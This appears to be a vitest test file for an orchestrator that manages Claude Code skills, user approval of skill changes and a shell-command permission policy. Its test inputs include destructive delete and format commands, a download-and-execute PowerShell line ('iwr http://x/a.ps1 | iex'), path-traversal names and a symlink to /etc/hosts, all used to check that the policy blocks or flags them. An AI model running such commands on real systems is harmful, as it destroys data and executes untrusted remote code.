import { describe, it, expect, beforeEach } from 'vitest'
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync, symlinkSync, realpathSync, readdirSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import { openDb } from '../src/main/db'
import { Store } from '../src/main/store'
import { Control } from '../src/main/queen/control'
import { SessionManager } from '../src/main/sessions'
import { TaskStore } from '../src/main/queen/tasks'
import { Orchestrator } from '../src/main/queen/orchestrator'
import { decide } from '../src/main/queen/permission'
import { SkillManager, type SkillChangeRequest } from '../src/main/skills/manager'
import { analyzeSkills, effective, parseFrontmatter, scanSkills, searchSkills } from '../src/main/skills/discovery'

const mk = () => realpathSync(mkdtempSync(join(tmpdir(), 'qskill-')))
const skill = (root: string, name: string, desc: string, body = 'Do the thing.', extra: Record<string, string> = {}) => {
  const d = join(root, name); mkdirSync(d, { recursive: true })
  writeFileSync(join(d, 'SKILL.md'), `---\nname: ${name}\ndescription: ${desc}\n---\n${body}\n`)
  for (const [p, c] of Object.entries(extra)) { mkdirSync(join(d, p, '..'), { recursive: true }); writeFileSync(join(d, p), c) }
}
const SKILL_MD = (d: string, body = 'body') => `---\nname: x\ndescription: ${d}\n---\n${body}\n`

describe('discovery', () => {
  it('parses frontmatter incl. block scalars and quotes', () => {
    expect(parseFrontmatter('---\nname: a\ndescription: "quoted"\n---\nbody').meta.description).toBe('quoted')
    expect(parseFrontmatter('---\ndescription: >\n  line one\n  line two\n---\nb').meta.description).toBe('line one line two')
    expect(parseFrontmatter('no frontmatter').meta).toEqual({})
  })
  it('finds personal + project skills, personal shadows project (verified Claude behaviour), identity = directory name', () => {
    const home = mk(), proj = mk()
    skill(home, 'dup', 'personal one'); skill(join(proj, '.claude', 'skills'), 'dup', 'project one'); skill(join(proj, '.claude', 'skills'), 'only-p', 'project only')
    mkdirSync(join(home, 'not-a-skill')) // no SKILL.md → ignored
    const all = scanSkills({ personalRoot: home, projectRoot: proj })
    expect(all.map((s) => s.id).sort()).toEqual([`personal:dup`, `project:${proj}:dup`, `project:${proj}:only-p`].sort())
    expect(all.find((s) => s.scope === 'project' && s.name === 'dup')!.shadowed).toBe(true)
    expect(effective(all, 'dup')!.scope).toBe('personal')
    expect(effective(all, 'only-p')!.scope).toBe('project')
    expect(effective(all, 'nope')).toBeUndefined()
  })
  it('search ranks name > description > body', () => {
    const home = mk()
    skill(home, 'pdf-tools', 'work with documents'); skill(home, 'other', 'handles pdf files'); skill(home, 'third', 'unrelated', 'mentions pdf deep inside')
    expect(searchSkills(scanSkills({ personalRoot: home }), 'pdf').map((s) => s.name)).toEqual(['pdf-tools', 'other', 'third'])
    expect(searchSkills(scanSkills({ personalRoot: home }), 'zzzz')).toEqual([])
  })
  it('flags duplicates (shadowed + similar), heuristic conflicts, missing/stale referenced files', () => {
    const home = mk(), proj = mk(), pr = join(proj, '.claude', 'skills')
    skill(home, 'a', 'format python source code with black formatter'); skill(pr, 'b', 'format python source code using black formatter')
    skill(home, 'dup', 'x'); skill(pr, 'dup', 'y')
    skill(home, 'c', 'one', 'You must always commit directly to main branch.'); skill(home, 'd', 'two', 'Never commit directly to main branch.')
    skill(pr, 'e', 'three', 'See [guide](references/guide.md) and run `scripts/run.sh`.', { 'scripts/run.sh': 'echo' })
    const issues = analyzeSkills(scanSkills({ personalRoot: home, projectRoot: proj }))
    const kinds = (k: string) => issues.filter((i) => i.kind === k)
    expect(kinds('duplicate').some((i) => /hidden by a personal skill/.test(i.detail))).toBe(true)
    expect(kinds('duplicate').some((i) => i.skills.length === 2 && /similar/.test(i.detail))).toBe(true)
    expect(kinds('conflict').length).toBe(1); expect(kinds('conflict')[0].confidence).toBe('low')
    expect(kinds('outdated').some((i) => /references\/guide.md/.test(i.detail))).toBe(true)
  })
})

function setup(approve: (req: SkillChangeRequest) => boolean | Promise<boolean> = () => true) {
  const home = mk(), proj = mk()
  const db = openDb(':memory:')
  let asked = 0
  const m = new SkillManager(db, { personalRoot: home, tmpBase: join(mk(), 'plug'), approve: async (_s, req) => { asked++; return approve(req) } })
  return { home, proj, db, m, asked: () => asked }
}

describe('SkillManager: hybrid approval policy', () => {
  it('reusing an existing skill (list/search/assign/build) never asks for approval', () => {
    const { proj, m, asked } = setup()
    skill(join(proj, '.claude', 'skills'), 'lint', 'lint things')
    expect(m.search(proj, 'lint').length).toBe(1)
    const chosen = m.assign('run1', 'T1', proj, ['lint'])
    m.buildPluginDir('k', chosen)
    expect(asked()).toBe(0)
    expect(m.assignments('run1')).toEqual([{ taskId: 'T1', skill: 'lint', skillId: chosen[0].id }])
    expect(() => m.assign('run1', 'T2', proj, ['missing'])).toThrow(/unknown skill/)
  })

  it('creating a skill writes NOTHING until approved; denial leaves no file', async () => {
    let seen: SkillChangeRequest | undefined
    let release!: (v: boolean) => void
    const { proj, m } = setup((r) => { seen = r; return new Promise<boolean>((res) => (release = res)) })
    const p = m.propose('sess1', proj, { name: 'new-skill', files: { 'SKILL.md': SKILL_MD('does stuff') } })
    await new Promise((r) => setTimeout(r, 30))
    expect(seen!.isNew).toBe(true); expect(seen!.changed).toEqual(['SKILL.md'])
    expect(existsSync(join(proj, '.claude/skills/new-skill'))).toBe(false) // pending: nothing on disk
    release(false)
    await expect(p).rejects.toThrow(/DENIED/)
    expect(existsSync(join(proj, '.claude/skills/new-skill'))).toBe(false)
    expect(m.versions(`project:${proj}:new-skill`)).toEqual([])
  })

  it('approved create + modify are versioned; baseline of the pre-existing content is kept; restore works', async () => {
    const { proj, m } = setup()
    const dir = join(proj, '.claude/skills/s1'); const id = `project:${proj}:s1`
    skill(join(proj, '.claude/skills'), 's1', 'original', 'ORIGINAL BODY')
    const orig = readFileSync(join(dir, 'SKILL.md'), 'utf8')
    await m.propose('sess1', proj, { name: 's1', files: { 'SKILL.md': SKILL_MD('changed', 'NEW BODY'), 'extra.md': 'x' } })
    expect(readFileSync(join(dir, 'SKILL.md'), 'utf8')).toContain('NEW BODY'); expect(existsSync(join(dir, 'extra.md'))).toBe(true)
    const v = m.versions(id)
    expect(v.map((x) => x.source)).toEqual(['agent', 'baseline'])
    m.restore(proj, id, 1)                    // back to the original
    expect(readFileSync(join(dir, 'SKILL.md'), 'utf8')).toBe(orig)
    expect(existsSync(join(dir, 'extra.md'))).toBe(false) // file that did not exist in v1 is removed
    expect(m.versions(id)[0].source).toBe('restore')
    m.restore(proj, id, 2)                    // forward again: history is never lost
    expect(readFileSync(join(dir, 'SKILL.md'), 'utf8')).toContain('NEW BODY')
    expect(() => m.restore(proj, id, 99)).toThrow(/no version/)
  })

  it('identical content needs no approval; stale approval (skill changed meanwhile) is refused', async () => {
    const { proj, m, asked } = setup()
    const files = { 'SKILL.md': SKILL_MD('same') }
    await m.propose('s', proj, { name: 'same', files })
    expect(asked()).toBe(1)
    expect(await m.propose('s', proj, { name: 'same', files })).toMatch(/No change/)
    expect(asked()).toBe(1)
    const { proj: p2, m: m2 } = setup(() => { writeFileSync(join(p2, '.claude/skills/race/SKILL.md'), SKILL_MD('tampered')); return true })
    skill(join(p2, '.claude/skills'), 'race', 'orig')
    await expect(m2.propose('s', p2, { name: 'race', files: { 'SKILL.md': SKILL_MD('mine') } })).rejects.toThrow(/changed on disk after approval/)
    expect(readFileSync(join(p2, '.claude/skills/race/SKILL.md'), 'utf8')).toContain('tampered')
  })

  it('rejects unsafe names, paths, missing SKILL.md/description, oversized files; refuses symlinked skill dir', async () => {
    const { proj, m, asked } = setup()
    const ok = SKILL_MD('d')
    for (const bad of [
      { name: '../evil', files: { 'SKILL.md': ok } }, { name: 'Up', files: { 'SKILL.md': ok } }, { name: 'a/b', files: { 'SKILL.md': ok } },
      { name: 'x', files: { 'notes.md': 'n' } }, { name: 'x', files: { 'SKILL.md': ok, '../out.md': 'n' } }, { name: 'x', files: { 'SKILL.md': ok, '/abs.md': 'n' } },
      { name: 'x', files: { 'SKILL.md': '---\nname: x\n---\nno description' } }, { name: 'x', files: { 'SKILL.md': ok, 'big.md': 'a'.repeat(300_000) } }
    ]) await expect(m.propose('s', proj, bad as any)).rejects.toThrow()
    await expect(m.propose('s', proj, { name: 'x', scope: 'bogus' as any, files: { 'SKILL.md': ok } })).rejects.toThrow(/scope/)
    expect(asked()).toBe(0) // invalid requests never reach the user
    const target = mk(); mkdirSync(join(proj, '.claude/skills'), { recursive: true }); symlinkSync(target, join(proj, '.claude/skills/linked'))
    await expect(m.propose('s', proj, { name: 'linked', files: { 'SKILL.md': ok } })).rejects.toThrow()
    expect(readdirSync(target)).toEqual([]) // nothing escaped through the symlink
  })

  it('personal-scope changes go through the same approval and land in the personal root', async () => {
    const { home, proj, m, asked } = setup()
    await m.propose('s', proj, { name: 'pers', scope: 'personal', files: { 'SKILL.md': SKILL_MD('p') } })
    expect(asked()).toBe(1); expect(existsSync(join(home, 'pers/SKILL.md'))).toBe(true)
  })

  it('plugin dir holds a copy of exactly the assigned skills, namespaced plugin, symlinks not copied', () => {
    const { home, proj, m } = setup()
    skill(join(proj, '.claude/skills'), 'a', 'A', 'b', { 'scripts/x.sh': 'echo' }); skill(join(proj, '.claude/skills'), 'b', 'B'); skill(home, 'c', 'C')
    symlinkSync('/etc/hosts', join(proj, '.claude/skills/a/leak'))
    const dir = m.buildPluginDir('t', m.resolveNames(proj, ['a', 'c']))
    expect(JSON.parse(readFileSync(join(dir, '.claude-plugin/plugin.json'), 'utf8')).name).toBe('queen')
    expect(readdirSync(join(dir, 'skills')).sort()).toEqual(['a', 'c'])
    expect(existsSync(join(dir, 'skills/a/scripts/x.sh'))).toBe(true)
    expect(existsSync(join(dir, 'skills/a/leak'))).toBe(false)
  })
})

describe('skill directories are protected from direct edits', () => {
  it('Write/Edit inside <project>/.claude/skills is denied; other project writes still allowed', () => {
    const proj = mk()
    expect(decide('Write', { file_path: join(proj, '.claude/skills/x/SKILL.md') }, proj)).toMatchObject({ decision: 'deny', rule: 'skill-protected' })
    expect(decide('Edit', { file_path: '.claude/skills/x/SKILL.md' }, proj).decision).toBe('deny')
    expect(decide('Write', { file_path: join(proj, 'src/a.ts') }, proj).decision).toBe('allow')
    expect(decide('Write', { file_path: join(process.env.HOME!, '.claude/skills/x/SKILL.md') }, proj).rule).toBe('project-boundary')
  })
  it('Bash that may modify skills asks the user; read-only listing does not', () => {
    const proj = mk()
    expect(decide('Bash', { command: 'echo hi > .claude/skills/x/SKILL.md' }, proj).decision).toBe('ask')
    expect(decide('Bash', { command: 'rm .claude/skills/x/SKILL.md' }, proj).decision).toBe('ask')
    expect(decide('Bash', { command: 'sed -i s/a/b/ .claude/skills/x/SKILL.md' }, proj).decision).toBe('ask')
    expect(decide('Bash', { command: 'ls .claude/skills' }, proj).decision).toBe('allow')
    expect(decide('Bash', { command: 'cat .claude/skills/x/SKILL.md' }, proj).decision).toBe('allow')
  })
})

describe('Orchestrator + Control: assignment, isolation flags, approval via MCP', () => {
  const FAKE = resolve(__dirname, 'fixtures/fake-claude.js')
  const until = async (f: () => boolean) => { const t = Date.now(); while (!f()) { if (Date.now() - t > 5000) throw new Error('timeout'); await new Promise((r) => setTimeout(r, 10)) } }
  async function world() {
    const argsDir = mk(); process.env.FAKE_ARGS_DIR = argsDir
    const proj = mk(); skill(join(proj, '.claude/skills'), 'lint', 'lint code'); writeFileSync(join(proj, 'CLAUDE.md'), 'CODEWORD-PINEAPPLE')
    const c = new Control(); await c.listen()
    const store = new Store(openDb(':memory:'))
    const tasks = new TaskStore(store.raw)
    const skills = new SkillManager(store.raw, { personalRoot: mk(), tmpBase: join(mk(), 'p'), approve: (sid, req) => c.requestSkillChange(sid, req) })
    const mgr = new SessionManager(store, FAKE, 8, c, resolve(__dirname, '../src/main/queen/hook-bridge.js'))
    new Orchestrator(c, mgr, tasks, async () => ({ ok: true, output: '' }), skills)
    const q = mgr.start({ name: 'q', cwd: proj, role: 'queen' })
    const tok = (id: string) => [...(c as any).byToken.entries()].find(([, r]: any) => r.sessionId === id)![0] as string
    const call = async (id: string, name: string, args: any = {}) => {
      const r: any = await fetch(`http://127.0.0.1:${c.port}/mcp/${tok(id)}`, { method: 'POST', body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name, arguments: args } }) }).then((x) => x.json())
      return { err: r.result.isError as boolean, text: r.result.content[0].text as string }
    }
    c.machineOf(q.id)!.askUser()
    const sub = call(q.id, 'submit_plan', { summary: 's', tasks: [{ title: 'one' }, { title: 'two' }] })
    await until(() => c.pending().length === 1)
    c.approvePlan(c.pending()[0].id, c.pending()[0].data.hash); await sub
    return { c, store, tasks, skills, mgr, q, call, proj, argsDir }
  }

  it('assign_task with skills starts the worker with isolation flags + CLAUDE.md; unknown skill starts no worker', async () => {
    const { tasks, mgr, q, call, argsDir, skills, proj } = await world()
    const bad = await call(q.id, 'assign_task', { task_id: 'T1', skills: ['ghost'] })
    expect(bad.err).toBe(true); expect(bad.text).toMatch(/unknown skill/)
    expect(tasks.get(q.id, 'T1')!.status).toBe('pending'); expect(mgr.list().filter((s) => s.role === 'worker').length).toBe(0)
    const ok = await call(q.id, 'assign_task', { task_id: 'T1', skills: ['lint'] })
    expect(ok.err).toBe(false); expect(ok.text).toMatch(/with skills: lint/)
    const w = tasks.get(q.id, 'T1')!.assignee!
    await until(() => existsSync(join(argsDir, w + '.json')))
    const args: string[] = JSON.parse(readFileSync(join(argsDir, w + '.json'), 'utf8'))
    const i = args.indexOf('--setting-sources'); expect(args[i + 1]).toBe('')
    const plug = args[args.indexOf('--plugin-dir') + 1]
    expect(readdirSync(join(plug, 'skills'))).toEqual(['lint'])
    const sp = args[args.indexOf('--append-system-prompt') + 1]
    expect(sp).toContain('queen:lint'); expect(sp).toContain('CODEWORD-PINEAPPLE')
    expect(skills.assignments(q.id)).toEqual([{ taskId: 'T1', skill: 'lint', skillId: `project:${proj}:lint` }])
    // a worker assigned WITHOUT skills keeps Claude's normal discovery (no isolation flags)
    await call(q.id, 'assign_task', { task_id: 'T2' })
    const w2 = tasks.get(q.id, 'T2')!.assignee!
    await until(() => existsSync(join(argsDir, w2 + '.json')))
    expect(JSON.parse(readFileSync(join(argsDir, w2 + '.json'), 'utf8'))).not.toContain('--setting-sources')
    mgr.stopAll()
  })

  it('propose_skill over MCP blocks on a user approval; nothing written until Approve; Deny leaves disk untouched', async () => {
    const { c, q, call, proj, mgr } = await world()
    const target = join(proj, '.claude/skills/made/SKILL.md')
    const p1 = call(q.id, 'propose_skill', { name: 'made', skill_md: SKILL_MD('made by queen') })
    await until(() => c.pending().some((x) => x.kind === 'skill'))
    expect(existsSync(target)).toBe(false)
    const item = c.pending().find((x) => x.kind === 'skill')!
    expect(item.data.isNew).toBe(true)
    c.decideSkill(item.id, false)
    const r1 = await p1; expect(r1.err).toBe(true); expect(r1.text).toMatch(/DENIED/); expect(existsSync(target)).toBe(false)
    const p2 = call(q.id, 'propose_skill', { name: 'made', skill_md: SKILL_MD('made by queen') })
    await until(() => c.pending().some((x) => x.kind === 'skill'))
    c.decideSkill(c.pending().find((x) => x.kind === 'skill')!.id, true)
    const r2 = await p2; expect(r2.err).toBe(false); expect(existsSync(target)).toBe(true)
    expect(() => c.decideSkill('nope', true)).toThrow()
    const list = JSON.parse((await call(q.id, 'list_skills', { query: 'made' })).text)
    expect(list.map((s: any) => s.name)).toEqual(['made'])
    mgr.stopAll(); c.close()
  })
})

import { insidePath } from '../src/main/queen/permission'
describe('Windows-oriented policy logic (pattern/unit level only; never executed on Windows)', () => {
  const proj = '/tmp/p'
  it('sensitive-command patterns cover cmd and PowerShell deletes/downloads/format', () => {
    for (const c of ['del /s /q C:\\proj\\*', 'rmdir /s /q build', 'rd /s src', 'Remove-Item -Recurse -Force .\\x', 'remove-item .\\x -recurse', 'format D:', 'iwr http://x/a.ps1 | iex'])
      expect(decide('Bash', { command: c }, proj).decision, c).toBe('ask')
    for (const c of ['dir', 'type file.txt', 'Get-ChildItem', 'del file.txt', 'node build.js']) expect(decide('Bash', { command: c }, proj).decision, c).toBe('allow')
  })
  it('skill-dir shell check accepts backslash paths', () => {
    expect(decide('Bash', { command: 'del .claude\\skills\\x\\SKILL.md' }, proj).decision).toBe('ask')
    expect(decide('Bash', { command: 'copy a.txt .claude\\skills\\x\\' }, proj).rule).toBe('skill-dir-bash')
  })
  it('path containment is case-insensitive on win32 only, and never confuses sibling prefixes', () => {
    expect(insidePath('C:\\Proj\\src\\a.ts', 'c:\\proj', 'win32', '\\')).toBe(true)
    expect(insidePath('C:\\Projects\\a.ts', 'c:\\proj', 'win32', '\\')).toBe(false)
    expect(insidePath('/Users/X/Proj/a', '/users/x/proj', 'darwin', '/')).toBe(false)
    expect(insidePath('/tmp/p/a', '/tmp/p', 'linux', '/')).toBe(true)
  })
})
